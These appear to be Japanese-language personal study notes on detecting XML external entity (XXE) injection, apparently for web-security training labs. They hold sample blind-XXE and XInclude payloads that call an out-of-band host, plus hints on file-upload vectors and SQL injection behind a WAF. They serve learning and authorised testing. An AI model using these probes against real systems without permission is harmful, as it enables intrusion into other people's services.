[⚡️XXEi](⚡️XXEi.md)
#### 注目ポイント

- bodyがXMLのPOSTリクエスト
	- Check stock機能：`/product/stock`

- Post Comment機能 = File upload機能
- XMLファイルインポート機能

---
## Detect

#### 基本

- [🔍XXEi](#注目ポイント)の(POST)リクエスト==全体==をActive Scanする : 4分ほどかかる
	- XMLのbodyがあるなら、bodyだけscan selected insertion pointするのが早い

- ⚠️：プレーンテキストでも、Content Type ConverterでXMLへ変換しリクエストするとXXEi脆弱性を検出できるかも？

---
#### Out-of-band(blind XXEi)

- Issueのリクエストが以下のような形式になっている。
```http
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR_DOMAIN/"> %xxe; ]>
<stockCheck><productId>7</productId><storeId>2</storeId></stockCheck>
```
- レスポンスはエラーになるが、Collaboratorへのアクセスを確認できたら検知
	- エラーが詳細だな〜と思ったら、DTD Blind Error messagesが可能かもしれない

---
#### Xinclude攻撃

###### 手動の場合(ほぼ必要ない)

パラメタにエンティティを注入
```http
productId=%26entitiy;&storeId=1
```
	or
Content Type ConverterでXMLへ変換して送信
```http
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<root>
    <productId>1</productId>
    <storeId>1</storeId>
</root>
```

- "Entities are not allowed..."がレスポンスに返れば検出 

###### Sccanerの結果

- Issue: Out-of-band resource load(HTTP)や(mediumだが)XML injection
- Issueのリクエストが以下のような形式になっている。
```http
productId=<ssk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://i9s619htny7103t1x117cs28yz43svgw4oref3.oastify.com/foo"/></ssk>
```

---
#### File upload & XXEi

- Post Comment機能など ❗️‼️

1. SVGやDOCXをアップロードしてみる
2. 無理なら[⚡️File upload vuln](../File%20upload%20vuln/⚡️File%20upload%20vuln.md)を試す

---
#### & SQLi

- めちゃめんどいのでなるべく避けたい。。。

- Check stock機能のPOSTリクエスト全体をActive scanにかけても何も検知しない場合、この可能性がある
- SQLmapにかけてみる -> 以下のようなエラーレスポンスが返るときはWAFフィルタが存在する可能性高い
```http
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

"Attack detected"
```

- リクエストで`7*7`と入力して正しく評価されるときは脆弱
![[Pasted image 20240220165422.png | 500]]

-> [⚡️XXEi](⚡️XXEi.md#SQL%20&%20XML%20&%20HackVertor)